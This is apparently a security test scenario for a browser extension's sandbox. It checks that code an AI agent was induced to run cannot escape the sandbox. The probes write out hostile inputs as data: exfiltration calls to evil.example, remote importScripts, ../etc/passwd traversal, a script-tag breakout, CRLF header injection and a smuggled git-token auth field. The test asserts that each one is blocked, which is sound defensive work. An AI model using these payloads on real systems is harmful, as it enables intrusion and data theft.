// Scenario 06: malicious iframe / sandboxed code attempts a sandbox escape.
//
// Adversary: code the agent was induced to run inside a peerd sandbox, a
// Notebook / headless script worker, or an a2a_run, tries to break out: open a
// raw socket to exfiltrate, load remote code, recover the native fetch, unseal
// the bridge, mint a fresh un-sealed realm, or traverse OPFS out of its root.
//
// Defense: the realm seal (applyRealmSeal) runs BEFORE any agent code and makes
// the postMessage bridge the ONLY network primitive, every raw channel throws
// NotebookEgressBlockedError, the native fetch is deleted off the prototype chain
// (not merely shadowed), and the bridge is pinned non-writable/non-configurable
// so in-realm sabotage can't unseat it. OPFS import paths collapse '..' so a job
// cannot climb out of its per-instance root.
//
// This scenario drives the REAL production seal function against a mock worker
// global (the browserless twin). The full real-worker-realm proof, actual
// DedicatedWorkerGlobalScope, seal-before-static-import ordering, the a2a run's
// egress + delegation refusals, and the connect-src 'none' page CSP second fence
//, runs in the in-browser suite named in `verifiedBy`.

import {
  type Scenario, type Probe, blocked, leaked, summarize,
} from '../harness.ts';
import { applyRealmSeal } from '../../../extension/engine-tabs/notebook-tab/notebook-neutralizers.js';
import { resolveRelativePath } from '../../../extension/peerd-engine/module-resolver.js';
import { composeApp, stripMetaRefresh } from '../../../extension/peerd-engine/app-compose.js';
import { normalizeRequest, needsWebWriteConfirm } from '../../../extension/peerd-engine/vm-net/http-bridge.js';

// A mock worker global shaped like a real DedicatedWorkerGlobalScope: raw
// constructors as own props, fetch/importScripts/caches on the prototype.
const freshGlobal = () => {
  const posted: any[] = [];
  const nativeFetch = function fetch() { return 'NATIVE-FETCH'; };
  const proto: any = {
    fetch: nativeFetch,
    importScripts: function importScripts() { return 'NATIVE-IMPORTSCRIPTS'; },
    caches: { open: () => 'x', match: () => undefined, has: () => false, delete: () => false, keys: () => [] },
    // indexedDB is a same-origin DURABLE edge on WorkerGlobalScope.prototype — not
    // network, but the sealed worker runs at the extension origin, so an unsealed
    // IDBFactory reaches the `peerd` DB (vault blob, always-loaded memory, grants,
    // audit, and other instances' rows). The seal must block it like caches.
    indexedDB: { open: () => 'NATIVE-IDB', deleteDatabase: () => 0, databases: () => [], cmp: () => 0 },
  };
  const g: any = Object.create(proto);
  g.XMLHttpRequest = function XMLHttpRequest() {};
  g.WebSocket = function WebSocket() {};
  g.EventSource = function EventSource() {};
  g.WebTransport = function WebTransport() {};
  g.Worker = function Worker() {};
  g.navigator = { sendBeacon: () => true };
  g.postMessage = (m: any) => posted.push(m);
  g.addEventListener = () => {};
  return { g, proto, nativeFetch };
};

const throwsEgress = (fn: () => unknown): { ok: boolean; detail: string } => {
  try { fn(); return { ok: false, detail: 'did NOT throw, escape succeeded' }; }
  catch (e: any) {
    const ok = e?.name === 'NotebookEgressBlockedError' || /peerd\.egress\.fetch/.test(String(e?.message));
    return { ok, detail: ok ? `${e?.name}: ${String(e?.message).slice(0, 48)}` : `threw wrong error: ${String(e)}` };
  }
};

export const scenario: Scenario = {
  id: '06-sandbox-escape',
  title: 'Sandbox escape (Notebook worker, App iframe, WebVM)',
  adversary: 'malicious sandboxed code',
  asset: 'the host origin, the network, and other sandbox instances',
  claim: 'Across all three sandbox kinds, confinement holds: the Notebook realm exposes only the audited fetch bridge (raw channels throw, native fetch unrecoverable, bridge un-unseatable) and no same-origin durable store — the Cache API and IndexedDB both throw, so the sealed extension-origin worker cannot reach the `peerd` database; the App iframe cannot break out of its inlined-worker shim or navigate the host; and the WebVM HTTP bridge refuses non-http(s) schemes, scrubs CRLF header injection, drops any smuggled auth field, and confirms body-bearing verbs.',
  threatModelRef: 'INV-6',
  tier: 'unit',
  async run() {
    const probes: Probe[] = [];
    const { g, proto, nativeFetch } = freshGlobal();
    applyRealmSeal(g);

    // 1) Raw exfil / remote-code channels all throw.
    const rawChannels: { label: string; fn: () => unknown }[] = [
      { label: 'open a raw WebSocket to exfiltrate', fn: () => new g.WebSocket('wss://evil.example/') },
      { label: 'open an EventSource / SSE channel', fn: () => new g.EventSource('https://evil.example/') },
      { label: 'open a WebTransport channel', fn: () => new g.WebTransport('https://evil.example/') },
      { label: 'importScripts remote code', fn: () => g.importScripts('https://evil.example/x.js') },
      { label: 'sendBeacon exfiltration', fn: () => g.navigator.sendBeacon('https://evil.example/', 'stolen') },
      { label: 'reach the network via the Cache API', fn: () => g.caches.open('x') },
      { label: 'open the extension-origin IndexedDB (vault blob, memory, grants, audit, sibling instances)', fn: () => g.indexedDB.open('peerd') },
      { label: 'delete an extension-origin IndexedDB database', fn: () => g.indexedDB.deleteDatabase('peerd') },
      { label: 'construct a WebSocketStream (missing-API stub)', fn: () => new g.WebSocketStream('wss://evil.example/') },
    ];
    for (const c of rawChannels) {
      const r = throwsEgress(c.fn);
      probes.push(r.ok ? blocked(c.label, r.detail) : leaked(c.label, r.detail));
    }

    // 2) Mint a fresh un-sealed realm to recover natives: refused.
    {
      const r = throwsEgress(() => new g.Worker('data:application/javascript,0'));
      probes.push(r.ok
        ? blocked('spawn a nested Worker to mint an un-sealed realm', r.detail)
        : leaked('spawn a nested Worker to mint an un-sealed realm', r.detail));
    }

    // 3) The native fetch is gone from the prototype chain, not just shadowed.
    {
      const protoGone = Object.getOwnPropertyDescriptor(proto, 'fetch') === undefined;
      const notNative = g.fetch !== nativeFetch;
      probes.push(protoGone && notNative
        ? blocked('recover the native fetch off WorkerGlobalScope.prototype', 'prototype fetch deleted; globalThis.fetch is the bridge, not the native')
        : leaked('recover the native fetch off WorkerGlobalScope.prototype', `protoGone=${protoGone} notNative=${notNative}`));
    }

    // 4) The bridge is pinned, reassign / delete / defineProperty cannot unseal it.
    {
      const sealed = g.fetch;
      try { g.fetch = () => 'evil'; } catch { /* strict throw ok */ }
      try { delete g.fetch; } catch { /* strict throw ok */ }
      let defineThrew = false;
      try { Object.defineProperty(g, 'fetch', { value: () => 'evil' }); } catch { defineThrew = true; }
      const pinned = g.fetch === sealed && defineThrew;
      probes.push(pinned
        ? blocked('unseat the fetch bridge (assign/delete/defineProperty)', 'defineProperty on the non-configurable slot threw; bridge unchanged')
        : leaked('unseat the fetch bridge (assign/delete/defineProperty)', `pinned=${g.fetch === sealed} defineThrew=${defineThrew}`));
      // and a reassigned raw channel still throws
      try { g.XMLHttpRequest = function () {}; } catch { /* ok */ }
      const r = throwsEgress(() => new g.XMLHttpRequest());
      probes.push(r.ok
        ? blocked('reassign XMLHttpRequest to a working native', r.detail)
        : leaked('reassign XMLHttpRequest to a working native', r.detail));
    }

    // 5) OPFS path traversal collapses, a job cannot climb out of its root.
    {
      const traversals = [
        '../../../../../../etc/passwd',
        '../secret.js',
        './a/../../b/../../../root.js',
      ];
      const escapes = traversals.map((rel) => {
        const resolved = resolveRelativePath('instance-root/lib/entry.js', rel);
        // Escape = the resolved path still contains a climbing '..' segment or an absolute root.
        const climbs = /(^|\/)\.\.(\/|$)/.test(resolved) || resolved.startsWith('/');
        return { rel, resolved, climbs };
      });
      const allContained = escapes.every((e) => !e.climbs);
      probes.push(allContained
        ? blocked('traverse OPFS out of the instance root via ../ imports', `all '..' collapsed (e.g. "${escapes[0].rel}": "${escapes[0].resolved}")`)
        : leaked('traverse OPFS out of the instance root via ../ imports', `escaping: ${JSON.stringify(escapes.filter((e) => e.climbs))}`));
    }

    // 6) App iframe: hostile bundle code cannot break out of the worker shim
    //    or drive a meta-refresh navigation out of the opaque frame.
    {
      const html = '<html><head></head><body><script>new Worker("w.js")</script></body></html>';
      const workerBreakout = '"</script><script>steal()</script>';
      const composed = composeApp({ 'index.html': html, 'w.js': workerBreakout }, 'index.html');
      const noRawBreakout = !composed.includes('</script><script>steal()</script>') && composed.includes('\\u003c/script>');
      probes.push(noRawBreakout
        ? blocked('embed </script> in an inlined App worker to break out of the shim', 'worker source `<` escaped to \\u003c, no executable breakout tag')
        : leaked('embed </script> in an inlined App worker to break out of the shim', 'raw </script><script> survived into the document'));

      const refreshed = stripMetaRefresh('<head><meta content="0;url=//evil.example" http-equiv=refresh></head>');
      const noRefresh = !/http-equiv\s*=\s*["']?refresh/i.test(refreshed);
      probes.push(noRefresh
        ? blocked('meta-refresh the App frame to an attacker URL', 'meta http-equiv=refresh stripped from the app HTML')
        : leaked('meta-refresh the App frame to an attacker URL', 'meta refresh survived'));
    }

    // 7) WebVM HTTP bridge: the guest cannot pick a dangerous scheme, inject
    //    headers via CRLF, or smuggle a credential-injection auth field.
    {
      const schemeBlocked = (['file:///etc/passwd', 'chrome://settings/'] as string[]).every((url) => {
        try { normalizeRequest({ url, method: 'GET' } as any); return false; } catch { return true; }
      });
      probes.push(schemeBlocked
        ? blocked('WebVM requests file:// / chrome:// to read local resources', 'normalizeRequest throws RangeError on non-http(s)/peerd:// schemes')
        : leaked('WebVM requests file:// / chrome:// to read local resources', 'a dangerous scheme was accepted'));

      const crlf = normalizeRequest({ url: 'https://x.example/', method: 'GET', headers: { X: 'a\r\nInjected: 1' } } as any);
      const scrubbed = !String(crlf.headers?.X ?? '').match(/[\r\n]/);
      probes.push(scrubbed
        ? blocked('CRLF-inject a second header through a WebVM request', `CR/LF scrubbed from the header value ("${crlf.headers?.X}")`)
        : leaked('CRLF-inject a second header through a WebVM request', 'CRLF survived in the header'));

      const withAuth = normalizeRequest({ url: 'https://x.example/', method: 'GET', auth: 'git' } as any);
      const authDropped = !('auth' in withAuth);
      probes.push(authDropped
        ? blocked('smuggle an auth field on the WebVM wire to attach the git token', 'normalizeRequest drops the auth field, only host control ops set credentials')
        : leaked('smuggle an auth field on the WebVM wire to attach the git token', 'auth field survived on the VM request'));

      const confirmGate = needsWebWriteConfirm('OPTIONS') && needsWebWriteConfirm('POST') && !needsWebWriteConfirm('GET');
      probes.push(confirmGate
        ? blocked('exfiltrate via a body-bearing WebVM verb without confirmation', 'POST/OPTIONS require user confirm; GET/HEAD do not')
        : leaked('exfiltrate via a body-bearing WebVM verb without confirmation', 'body-bearing verb classification wrong'));
    }

    const result = summarize(probes, [
      'applyRealmSeal (raw-channel block + native deletion + bridge pin)',
      'resolveRelativePath (OPFS ".." collapse)',
      'composeApp + stripMetaRefresh (App iframe breakout/navigation defense)',
      'normalizeRequest + needsWebWriteConfirm (WebVM bridge scheme/CRLF/auth/confirm)',
    ]);
    // The pure seal runs here; the real-worker-realm proof (and the a2a run's
    // egress + delegation refusals) is exercised in the in-browser suite:
    result.verifiedBy = [
      'extension/tests/unit/engine-tabs/notebook-tab/notebook-seal.test.js (real worker realm)',
      'extension/tests/unit/offscreen/job-runner.test.js (a2a run denied egress + delegation)',
      'extension/tests/unit/red-team/sandbox-escape.test.js (in-browser red-team framing)',
    ].join('; ');
    return result;
  },
};
